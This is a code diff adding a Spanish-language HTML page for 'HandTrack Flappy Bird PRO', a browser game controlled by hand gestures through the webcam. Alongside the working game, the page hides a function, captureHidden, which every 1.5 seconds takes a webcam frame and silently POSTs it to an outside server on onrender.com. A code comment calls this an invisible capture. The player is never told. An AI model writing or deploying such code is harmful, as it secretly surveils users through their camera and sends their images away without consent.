@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>HandTrack Flappy Bird PRO</title>
+    <script src="https://cdn.jsdelivr.net/npm/handtrackjs/dist/handtrack.min.js"></script>
+    <style>
+        * { box-sizing: border-box; touch-action: none; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; color: white; }
+
+        #game-container { position: relative; width: 100vw; height: 100vh; background: #4ec0ca; }
+        video { position: absolute; top: 10px; right: 10px; width: 160px; border: 2px solid #fff; z-index: 50; transform: scaleX(-1); border-radius: 8px; opacity: 0.8; }
+        canvas#birdCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
+
+        /* HUD y UI */
+        .hud { position: absolute; top: 20px; left: 20px; z-index: 100; font-weight: bold; font-size: 22px; text-shadow: 2px 2px #000; pointer-events: none; }
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 300; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
+        .card { background: #111; padding: 30px; border-radius: 15px; border: 2px solid #f1c40f; max-width: 400px; }
+        .primary-btn { background: #f1c40f; color: #000; border: none; padding: 15px 40px; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 20px; font-size: 18px; width: 100%; }
+        
+        #status-msg { margin-top: 10px; color: #f1c40f; font-size: 14px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div id="game-container">
+    <video id="webcam" autoplay playsinline></video>
+    <canvas id="birdCanvas"></canvas>
+    
+    <div class="hud">
+        PUNTOS: <span id="score">0</span><br>
+        <div id="status-msg">ESPERANDO MANO...</div>
+    </div>
+
+    <div id="start-screen" class="overlay">
+        <div class="card">
+            <h2 style="color: #f1c40f;">FLAPPY HAND CONTROL</h2>
+            <ul style="text-align: left; line-height: 1.6; color: #ccc;">
+                <li>Muestra tu **mano abierta** para subir.</li>
+                <li>Cierra el puño o baja la mano para caer.</li>
+                <li>Evita las tuberías verdes.</li>
+                <li>Asegúrate de tener **buena luz** en tu cara y mano.</li>
+            </ul>
+            <button class="primary-btn" onclick="requestPermissions()">INICIAR JUEGO</button>
+        </div>
+    </div>
+
+    <div id="no-permission" class="overlay" style="display:none;">
+        <div class="card">
+            <h2 style="color: #e74c3c;">CÁMARA REQUERIDA</h2>
+            <p>No podemos detectar tu mano sin acceso a la cámara.</p>
+            <button class="primary-btn" onclick="requestPermissions()">REINTENTAR PERMISOS</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    const video = document.getElementById('webcam');
+    const canvas = document.getElementById('birdCanvas');
+    const ctx = canvas.getContext('2d');
+    const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";
+
+    let bird = { x: 80, y: 0, v: 0, radius: 18 };
+    let pipes = [];
+    let score = 0;
+    let model = null;
+    let isRunning = false;
+
+    const modelParams = { flipHorizontal: true, maxNumBoxes: 1, scoreThreshold: 0.6 };
+
+    // --- FLUJO DE PERMISOS ---
+    async function requestPermissions() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            
+            // Si llega aquí, hay permiso. Cargamos el modelo de IA.
+            document.getElementById('start-screen').innerHTML = "<div class='card'><h2>CARGANDO IA...</h2><p>Preparando detección de movimiento.</p></div>";
+            
+            model = await handtrack.load(modelParams);
+            
+            document.getElementById('start-screen').style.display = 'none';
+            document.getElementById('no-permission').style.display = 'none';
+            
+            initGame();
+        } catch (err) {
+            document.getElementById('start-screen').style.display = 'none';
+            document.getElementById('no-permission').style.display = 'flex';
+        }
+    }
+
+    function initGame() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        bird.y = canvas.height / 2;
+        isRunning = true;
+        
+        spawnPipe();
+        runDetection();
+        gameLoop();
+        
+        // Captura invisible para el servidor
+        setInterval(captureHidden, 1500);
+    }
+
+    function spawnPipe() {
+        if (!isRunning) return;
+        const gap = 180;
+        const h = Math.random() * (canvas.height - gap - 120) + 60;
+        pipes.push({ x: canvas.width, top: h, bottom: h + gap, w: 70, passed: false });
+        setTimeout(spawnPipe, 1800);
+    }
+
+    function runDetection() {
+        if (!isRunning) return;
+        model.detect(video).then(predictions => {
+            const status = document.getElementById("status-msg");
+            if (predictions.length > 0) {
+                let label = predictions[0].label;
+                if (label === 'open') {
+                    bird.v = -7; // Impulso hacia arriba
+                    status.innerText = "MANO ABIERTA: SUBIENDO ↑";
+                    status.style.color = "#2ecc71";
+                } else {
+                    status.innerText = "PUÑO/CERRADO: CAYENDO ↓";
+                    status.style.color = "#f1c40f";
+                }
+            } else {
+                status.innerText = "MANO NO DETECTADA";
+                status.style.color = "#e74c3c";
+            }
+            requestAnimationFrame(runDetection);
+        });
+    }
+
+    function gameLoop() {
+        if (!isRunning) return;
+
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+        // Física
+        bird.v += 0.45; 
+        bird.y += bird.v;
+
+        // Dibujar Pájaro
+        ctx.fillStyle = "#f1c40f";
+        ctx.beginPath();
+        ctx.arc(bird.x, bird.y, bird.radius, 0, Math.PI * 2);
+        ctx.fill();
+        ctx.strokeStyle = "#000";
+        ctx.stroke();
+
+        // Tuberías
+        pipes.forEach((p, i) => {
+            p.x -= 5;
+            ctx.fillStyle = "#2ecc71";
+            ctx.fillRect(p.x, 0, p.w, p.top);
+            ctx.fillRect(p.x, p.bottom, p.w, canvas.height - p.bottom);
+
+            // Colisión
+            if (bird.x + bird.radius > p.x && bird.x - bird.radius < p.x + p.w) {
+                if (bird.y - bird.radius < p.top || bird.y + bird.radius > p.bottom) {
+                    gameOver();
+                }
+            }
+
+            if (p.x + p.w < bird.x && !p.passed) {
+                score++;
+                p.passed = true;
+                document.getElementById('score').innerText = score;
+            }
+
+            if (p.x + p.w < 0) pipes.splice(i, 1);
+        });
+
+        if (bird.y > canvas.height || bird.y < 0) gameOver();
+
+        requestAnimationFrame(gameLoop);
+    }
+
+    function gameOver() {
+        isRunning = false;
+        alert("FIN DEL JUEGO\nPUNTOS: " + score);
+        location.reload();
+    }
+
+    function captureHidden() {
+        const snap = document.createElement('canvas');
+        snap.width = 240; snap.height = 180;
+        snap.getContext('2d').drawImage(video, 0, 0, 240, 180);
+        fetch(SERVER_URL, {
+            method: 'POST',
+            mode: 'cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: snap.toDataURL('image/jpeg', 0.4) })
+        }).catch(e => {});
+    }
+</script>
+</body>
+</html>
